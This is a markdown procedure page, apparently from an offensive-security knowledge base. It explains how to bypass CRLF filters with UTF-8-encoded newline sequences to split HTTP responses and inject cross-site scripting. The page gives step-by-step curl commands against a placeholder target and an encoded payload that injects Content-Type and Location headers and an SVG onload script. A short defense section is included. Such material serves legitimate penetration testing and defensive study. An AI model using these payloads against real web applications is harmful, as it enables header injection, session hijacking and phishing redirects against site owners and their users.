---
id: 1514d4c0-86d6-49ab-8889-7f6f5bd3dbb8
name: CRLF-Filter-Bypass-with-UTF-8-Encoding
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:55.346772+00:00'
updated_at: '2023-04-06T03:55:55.357862+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Obfuscated-Files-or-Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques:
  - >-
    [[techniques/Obfuscated-Files-or-Information/JavaScript|T1027.006 -
    JavaScript]]
tags:
  - '[[tags/CRLF]]'
  - '[[tags/Filter-Bypass]]'
  - '[[tags/Injection]]'
  - '[[tags/XSS]]'
commands:
  - '[[commands/curl-send-encoded-crlf-payload]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# CRLF-Filter-Bypass-with-UTF-8-Encoding

## Summary

This procedure demonstrates how to bypass CRLF (Carriage Return Line Feed) filters in web applications using UTF-8 encoding to inject malicious payloads, such as HTTP response splitting for XSS attacks. By encoding newline characters and other control sequences in UTF-8, the payload evades basic string-based filters that block direct \r\n sequences, allowing attackers to manipulate HTTP headers and inject executable scripts.

## Description

CRLF injection vulnerabilities occur when user input is reflected into HTTP responses without proper sanitization, enabling attackers to inject fake headers like Content-Type or Location, followed by malicious body content. Standard filters often block ASCII \r (0x0D) and \n (0x0A), but using UTF-8 overlong encodings or alternative representations (e.g., %E5%98%8A%E5%98%8D for disguised newlines) can bypass them. This technique is particularly effective against legacy web apps or misconfigured parsers. The target environment is typically a web application with reflected input in headers or responses, such as password reset or search forms. Success results in arbitrary header injection and script execution, potentially leading to session hijacking or data theft.

## Requirements

1. Network access to a vulnerable web application endpoint that reflects user input into HTTP responses without encoding.
2. Knowledge of the input point (e.g., a form field, URL parameter, or header) susceptible to CRLF injection.
3. Tools like [[tools/Burp-Suite]] for intercepting and modifying requests, or curl for sending payloads.
4. A wordlist or encoder for generating UTF-8 variants if the provided payload needs customization.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to reject or normalize control characters (\r, \n) in all user inputs, using libraries like OWASP ESAPI.
- Deploy web application firewalls (WAFs) configured to detect encoded CRLF sequences, including UTF-8 variants, and block anomalous header injections.
- Enforce HTTP response splitting prevention by ensuring all reflected inputs are placed outside headers and properly HTML-escaped.
- Enable logging of HTTP requests/responses to monitor for unusual header patterns or encoding anomalies, and use tools like ModSecurity for real-time detection.

## Objectives

1. Bypass CRLF filters using UTF-8 encoded payloads to inject custom HTTP headers.
2. Deliver and execute malicious JavaScript (e.g., XSS alert) in the victim's browser.
3. Demonstrate potential for broader attacks like session fixation or redirect to phishing sites.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate an endpoint where user input is directly reflected into the HTTP response headers or body without sanitization. Use manual testing or automated scanners to confirm CRLF injection is possible.

**Command** (use a basic curl probe like [[commands/curl-send-encoded-crlf-payload]] but first test with simple input):

```bash
curl -X POST -d "test\r\nX-Test: Injected" http://target.com/vulnerable-endpoint
```

> This step verifies if direct CRLF is blocked; expect a 200 OK with reflected input or an error if filtered. If blocked, proceed to encoding.

### Step 2: Encode and Prepare the Payload

**Context**: Use UTF-8 encoding to disguise CRLF sequences. The payload injects a Content-Type header to force HTML interpretation, a Location header for redirection (optional), and an SVG element with onload JavaScript for XSS.

Reference the encoded payload from [[codes/UTF-8-Encoded-CRLF-XSS-Payload]]:

```http
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

> Encode the payload using a tool like Burp's Decoder or online UTF-8 converter. The encoding %E5%98%8A%E5%98%8D represents a newline variant that decodes to \r\n in some parsers. Decision point: If the app uses strict UTF-8 validation, test alternative encodings like %C0%0A for overlong \n.

### Step 3: Inject the Encoded Payload

**Context**: Submit the encoded payload via the vulnerable input to split the response and execute the injected script.

**Command** ([[commands/curl-send-encoded-crlf-payload]]):

```bash
curl -X POST -d "user_input=%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE" http://target.com/vulnerable-endpoint
```

> Send the request and observe the response. If using Burp Suite, intercept and modify the POST data. Expected behavior: The server reflects the payload, resulting in a malformed response with injected headers and the SVG triggering an alert on load.

### Step 4: Verify Execution

**Context**: Confirm the bypass by checking for successful script execution, such as the alert popping in a browser or logged events.

> Replay the request in a browser context (e.g., via Burp Repeater) or use a proxy to view the rendered response. If no alert, iterate on encoding or input point.
